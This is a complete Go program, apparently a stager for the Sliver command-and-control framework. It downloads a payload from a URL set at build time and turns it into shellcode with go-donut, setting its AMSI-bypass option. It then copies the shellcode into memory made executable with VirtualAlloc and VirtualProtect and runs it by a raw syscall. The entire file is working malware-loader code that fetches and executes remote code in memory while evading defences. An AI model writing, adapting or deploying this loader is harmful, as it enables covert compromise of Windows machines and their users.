package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"syscall"
	"unsafe"

	donut "github.com/Binject/go-donut/donut"
	"golang.org/x/sys/windows"
)

const (
	// MEM_COMMIT is a Windows constant used with Windows API calls
	MEM_COMMIT = 0x1000
	// MEM_RESERVE is a Windows constant used with Windows API calls
	MEM_RESERVE = 0x2000
	// PAGE_EXECUTE_READ is a Windows constant used with Windows API calls
	PAGE_EXECUTE_READ = 0x20
	// PAGE_READWRITE is a Windows constant used with Windows API calls
	PAGE_READWRITE = 0x04
)

/* -X main.StagerURL=url */
var StagerURL string

func exit(statusCode int) {
	os.Exit(statusCode)
}

func genSliverStager() {
	r, err := http.Get(StagerURL)
	if err != nil {
		fmt.Println(err.Error())
		exit(1)
	}
	defer r.Body.Close()

	payload, _ := ioutil.ReadAll(r.Body)

	/* default donut config, changed arch from x84 to x64 */
	config := &donut.DonutConfig{
		Arch:     donut.X64,
		Type:     donut.DONUT_MODULE_EXE,
		InstType: donut.DONUT_INSTANCE_PIC,
		Entropy:  donut.DONUT_ENTROPY_DEFAULT,
		Compress: 1,
		Format:   1,
		Bypass:   3,
	}

	sc, err := donut.ShellcodeFromBytes(bytes.NewBuffer(payload), config)
	if err != nil {
		fmt.Println(err.Error())
		exit(1)
	}

	exec(sc.Bytes())
}

func exec(sc []byte) {
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

	addr, _, errVirtualAlloc := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAlloc failed and returned 0")
	}

	_, _, errRtlCopyMemory := RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

	if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", errRtlCopyMemory.Error()))
	}

	oldProtect := PAGE_READWRITE
	_, _, errVirtualProtect := VirtualProtect.Call(addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", errVirtualProtect.Error()))
	}

	_, _, errSyscall := syscall.Syscall(addr, 0, 0, 0, 0)

	if errSyscall != 0 {
		log.Fatal(fmt.Sprintf("[!]Error executing shellcode syscall:\r\n%s", errSyscall.Error()))
	}
}

func main() {
	genSliverStager()
}
